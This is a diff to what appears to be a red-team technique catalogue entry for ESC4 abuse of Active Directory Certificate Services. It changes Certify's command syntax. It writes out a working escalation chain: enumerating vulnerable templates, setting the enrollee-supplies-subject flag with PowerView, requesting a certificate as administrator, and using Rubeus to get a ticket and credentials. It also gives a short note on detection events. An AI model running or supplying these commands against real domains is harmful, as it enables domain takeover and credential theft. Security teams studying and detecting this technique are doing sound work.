@@ -20,14 +20,14 @@ detection_signal: |
   Certificate template modification (attribute write on the PKI container) generates
   Event 5136 on DCs (directory service object modification). The msPKI-Enroll-Attributes
   and msPKI-Certificate-Name-Flag write on a template object is detectable. Certify/Certipy
-  `find` will detect the modification afterward. MDI monitors PKI configuration changes.
+  current-version template enumeration may detect the modification afterward. MDI monitors PKI changes.
 usage_examples:
   - description: Identify ESC4-vulnerable templates (controlled principal with write rights)
-    args: "Certify.exe find /vulnerable"
+    args: "Certify.exe enum-templates --filter-vulnerable"
   - description: Step 1 — Add ENROLLEE_SUPPLIES_SUBJECT flag to a template we have write rights over
     args: "(PowerView) Set-DomainObject -Identity 'VulnTemplate' -Set @{msPKI-Certificate-Name-Flag=1}"
   - description: Step 2 — Request certificate with SAN for target user
-    args: "Certify.exe request /ca:CASERVER\\\\CA-NAME /template:VulnTemplate /altname:administrator"
+    args: "Certify.exe request --ca CASERVER\\CA-NAME --template VulnTemplate --upn administrator@domain.local"
   - description: Step 3 — Authenticate with certificate
     args: "Rubeus.exe asktgt /user:administrator /certificate:<base64pfx> /getcredentials /show"
   - description: Certipy combined approach
@@ -63,7 +63,7 @@ arbitrary UPN in the Subject Alternative Name.
 
 ```
 Prerequisite: GenericWrite / WriteProp on a certificate template object
-(identified by Certify find /vulnerable or BloodHound ACL edge to template DN)
+(identified by Certify enum-templates --filter-vulnerable or BloodHound ACL edge to template DN)
 
 1. Save original template configuration:
    certipy template -u user -p pass -dc-ip DC_IP -template VulnTemplate -save-old
@@ -74,7 +74,7 @@ Prerequisite: GenericWrite / WriteProp on a certificate template object
    PowerView: Set-DomainObject 'VulnTemplate' -Set @{msPKI-Certificate-Name-Flag=1}
 
 3. Request certificate with admin SAN (now ESC1-equivalent):
-   Certify.exe request /ca:CA /template:VulnTemplate /altname:administrator@domain.local
+   Certify.exe request --ca SERVER\CA-NAME --template VulnTemplate --upn administrator@domain.local
 
 4. Authenticate and get hash:
    Rubeus.exe asktgt /user:administrator /certificate:<pfx> /getcredentials /show /ptt
